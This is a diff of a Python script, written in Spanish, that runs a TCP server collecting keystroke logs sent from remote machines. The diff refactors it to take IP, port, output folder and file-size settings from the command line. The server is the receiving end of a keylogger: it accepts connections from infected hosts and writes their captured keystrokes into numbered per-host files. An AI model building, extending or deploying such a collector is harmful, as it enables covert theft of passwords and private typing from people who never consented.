@@ -1,67 +1,70 @@
 import socket
 import threading
 from pathlib import Path
+from argparse import ArgumentParser
+from typing import List
 
-
-KEYLOGGER_FILE_LENGTH = 10
-TCP_PORT = 8080
-ruta = Path(__file__).parent / 'files'
-if not ruta.exists():
-    ruta.mkdir()
-
-
-def file_manager(host, msg):
-    # Buscar archivos en la carpeta files que tengan el mismo nombre que el host
-    # patron: host_{id}.txt
-    archivos = list(ruta.glob(f'{host}_*.txt'))
+def to_file(host, msg, output, buffer_length, id_zfill=3):
+    archivos: List[Path] = sorted(list(output.glob(f'{host}_*.txt')))
     if not archivos:
-        # Si no hay archivos, crear uno nuevo
-        archivo: Path = ruta / f'{host}_1.txt'
-        archivo.write_text(msg)
+        file_id = "1".zfill(id_zfill)
+        archivo = output / f'{host}_{file_id}.txt'
+        with open(archivo, "a") as f:
+            f.write(msg)
     else:
-        # Si hay archivos, buscar el último
         archivo = archivos[-1]
-        contenido = archivo.read_text()
-        # Si el texto del archivo es menor a 1000 caracteres, agregar el mensaje
-        # recibido al final del archivo
-        if len(contenido) < KEYLOGGER_FILE_LENGTH:
-            archivo.write_text(msg)
-        else:
-            # Si el texto del archivo es mayor a 1000 caracteres, crear un nuevo
-            # archivo con el siguiente id
-            file_id = int(archivo.stem.split('_')[-1]) + 1
-            archivo = ruta / f'{host}_{file_id}.txt'
-            archivo.write_text(msg)
+        if len(archivo.read_text()) >= buffer_length:
+            file_id = str(int(archivo.stem.split('_')[-1]) + 1)
+            archivo = output / f'{host}_{file_id.zfill(id_zfill)}.txt'
+        with open(archivo, "a") as f:
+            f.write(msg)
 
 
 
-def handle_client(conexion, direccion):
+def handle_client(conexion, direccion, output, id_zfill=3, buffer_length=1000):
     host, _ = direccion
+    buffer = 0
     while True:
         datos = conexion.recv(1024)
         if not datos:
             break
 
-        # Procesar los datos recibidos
-        mensaje = datos.decode('utf-8')
-        file_manager(host, mensaje)
-        print('Se ha recibido el siguiente mensaje:', mensaje)
+        msg = datos.decode('utf-8')
+        to_file(host, msg, output, buffer_length, id_zfill)
+        if buffer < buffer_length:
+            buffer += 1
+        else:
+            buffer = 0
+        print('Se ha recibido el siguiente mensaje:', msg)
 
     # Cerrar la conexión entrante
     conexion.close()
 
 
 def main():
+    parser = ArgumentParser(description="Servidor TCP Receptor de KeyLogs")
+    parser.add_argument("-ip", "--ip-address", required=True, help="Dirección IP del Servidor TCP")
+    parser.add_argument("-p", "--port", help="Puerto del Servidor TCP (default 8080)", default=8080, type=int)
+    parser.add_argument('-o', '--output', help="Carpeta donde irán los resultados", default="files", type=str)
+    parser.add_argument('--zero-fill', help="Número de ceros en el nombre de los ficheros (default: 3)", default=3, choices=list(range(1,6)), type=int)
+    parser.add_argument('--buffer-length', help="Número de carácteres dentro del buffer antes de escribir en el fichero (default: 1000)", default=1000, type=int)
+    args = parser.parse_args()
+
+    ruta = Path(__file__).parent / args.output
+    if not ruta.exists():
+        ruta.mkdir()
+
     servidor_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    servidor_socket.bind(('192.168.1.52', TCP_PORT))
-    print(f'Escuchando conexiones entrantes en el puerto: {TCP_PORT}')
+    servidor_socket.bind((args.ip_address, args.port))
+    print(f'Escuchando conexiones entrantes en el puerto: {args.port}')
     servidor_socket.listen()
 
     while True:
         conexion, direccion = servidor_socket.accept()
         print('Se ha establecido una conexión desde', direccion)
         hilo = threading.Thread(target=handle_client,
-                                args=(conexion, direccion))
+                                args=(conexion, direccion, ruta,
+                                      args.zero_fill, args.buffer_length))
         hilo.start()
 
 
